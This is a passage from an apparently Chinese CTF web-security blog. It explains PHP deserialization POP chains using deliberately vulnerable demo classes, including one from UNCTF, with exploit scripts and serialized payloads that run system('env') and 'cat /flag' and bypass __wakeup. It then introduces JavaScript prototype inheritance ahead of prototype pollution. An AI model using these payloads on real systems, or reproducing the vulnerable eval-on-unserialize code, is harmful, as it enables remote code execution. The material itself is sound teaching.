class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>加入一个变量public my，然后反序列化看结果，发现变脸按照顺序排列再字典中，名字+值+名字2+值2。。。。。且可以看到<code>protected</code>变量和private又有一点点的区别，%00中间的是<code>*</code>。</p><p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119105254021.png" alt="image-20221119105254021"></p><h3 id="pop-Demo"><a class="header-anchor" href="#pop-Demo">¶</a>pop Demo</h3><p>前面已经提到了特殊的函数会在一些特殊的时机调用，而pop链就是利用反序列化时候的一些跳板，进行不断地层次调用，最后执行到<code>exec或者system eval</code>等函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$key2</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key2</span><span class="token operator">-></span><span class="token function">abab</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这个属于比较简单的反序列化，思路是，首先关注到<code>eval($this-&gt;code);</code>，然后考虑到如何执行到这一步，一点点寻找必要条件，最终可以发发现：</p><p>class B再 <code>__destruct</code>的时候有个<code>echo</code>，如果key为class C的时候，可以触发<code>__toString</code>，然后通过abab函数的调用触发<code>__call</code>，此时如果传入的序列化变量可控，那么eval的内容就可控，从而RCE。</p><p>exp如下</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">key2</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('env');"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>注意这里出来的key2是一个public变量，所以人为的要做一些修饰改变</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">poc<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"B"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"key2"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"code"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system('env');"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>   poc<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"B"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00C%00key2"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"code"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system('env');"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment">// 改编为私有变量</span>poc<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"B"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00C%00key2"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"A"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"code"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system('env');"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment">//增加A的变量个数，绕过__wakeup函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>还需要注意的是绕过<code>__wakeup</code>函数。</p><p>下面这个例子就会比较简单一点</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Exec</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">execute</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1!5!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"test123"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>        <span class="token variable">$name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">" JUST FOR FUN"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"UNCTF"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'3.1415926'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pop<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>       <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$a</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token constant">UNCTF</span> <span class="token constant">JUST</span> <span class="token keyword">FOR</span> <span class="token constant">FUN</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这个比较简单，但是有一坑，show函数是无法调用的，所以考虑利用__toString函数的时候需要考虑到<code>Login</code>类的<code>__destruct</code>函数，exp如下</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Exec</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Login</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exec</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exec</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">content</span><span class="token operator">=</span><span class="token string single-quoted-string">'system("cat /flag");'</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'3.1415926'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">key</span><span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//O:5:"Login":2:&#123;s:4:"code";s:9:"3.1415926";s:3:"key";O:4:"Exec":1:&#123;s:7:"content";O:4:"Test":1:&#123;s:4:"test";O:4:"Exec":1:&#123;s:7:"content";s:20:"system("cat /flag");";&#125;&#125;&#125;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>同样的需要绕过wakeup函数</p><p>ps: 😸总的来说反序列化对pwn手来说比较友好，漏洞的类型和利用，都是代码漏洞，没有sql注入之类的那么多waf和弯弯肠子😢</p><h2 id="JavaScript原型链污染"><a class="header-anchor" href="#JavaScript原型链污染">¶</a>JavaScript原型链污染</h2><p>这个听起来比较高级，实际上也不是很高级，涉及到面向对象的知识比较多，感觉对新人不是很友好，这个必须从基础原理开始，首先要理解的是JavaScript中，一切皆对象的一种理念，同时类和类之间又存在着继承关系，所以有着原型的说法。</p><h3 id="prototype-和-proto"><a class="header-anchor" href="#prototype-和-proto">¶</a><code>prototype</code> 和 <code>__proto__</code></h3><p>在JavaScript中，如果要定义一个类，那么需要以定义**“构造函数”**的方式来的定义，换句话说，即每个JavaScript对象都有相应的构造函数，例如</p><figure><div class="code-wrapper"><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">function Foo() &#123;    this.bar &#x3D; 1&#125;new Foo()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里的<code>Foo</code>函数就是构造函数，<code>bar</code>是<code>Foo</code>类的一个成员变量</p><blockquote><p>以上是原始的构造方法，在ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p></blockquote><p>一个类除了成员变量，一定还有方法，function定义在类的构造函数当中：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">show</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>bar<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>但是这里有一个问题，show函数以变量的形式写在构造函数当中，那么这个show函数实际上是和对象绑定的，而不是和类绑定的，即上述的代码中show函数会执行两次；</p><blockquote><p>但是这个问题貌似在较新版本中也不存在</p></blockquote><p>如果希望show函数被 定义在类上那么就需要用到<code>prototype</code>属性了，<code>prototype</code>为原型的意思，是类的一个属性，通过这个属性可以访问到Foo类的原型</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">show</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>foo<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>用以上的办法把类定义在Foo的原型中，这样所有Foo的实例化对象都具有从原型继承下来的show函数。</p><p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119232937431.png" alt="image-20221119232937431"></p><p>可以很明显的发现，Foo的prototype属性在执行完毕show的定义之后，就多出来了show方法，且被继承到了foo中。</p><p>讲完了<code>prototype</code>就看到<code>__proto__</code>，有以下等式。</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">foo<span class="token punctuation">.</span>__proto__ <span class="token operator">==</span> <span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>实例化出来的对象可以通过<code>__proto__</code>访问Foo类的原型。</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li></ol><h3 id="原型链继承和污染"><a class="header-anchor" href="#原型链继承和污染">¶</a>原型链继承和污染</h3><p>上面提到的第一点，所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特点被JavaScript利用作为类的继承方法。</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Father</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>first_name <span class="token operator">=</span> <span class="token string">'Donald'</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>last_name <span class="token operator">=</span> <span class="token string">'Trump'</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">Son</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>first_name <span class="token operator">=</span> <span class="token string">'Melania'</span><span class="token punctuation">&#125;</span><span class="token class-name">Son</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Father</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">let</span> son <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Son</span><span class="token punctuation">(</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Name: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>son<span class="token punctuation">.</span>first_name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>son<span class="token punctuation">.</span>last_name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>以上的代码中，<code>Father</code>类的<code>last_name</code>被继承给了<code>Son</code>，所以输出是Name: Melania Trump。需要知道的是，JavaScript引擎在寻找son的last_name的时候做了什么：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><p>简单的来说就是不断地寻找类的原型，查看他们的属性，直到为NULL或者找到。</p><p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119234035784.png" alt=""></p><p>可以看见son的prototype中实际上也有firstname，但是son自己有了，所以就没有向上回溯，JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p><p>牢记以下几点即可</p><ol><li>foo.<code>__ptoto__</code> == 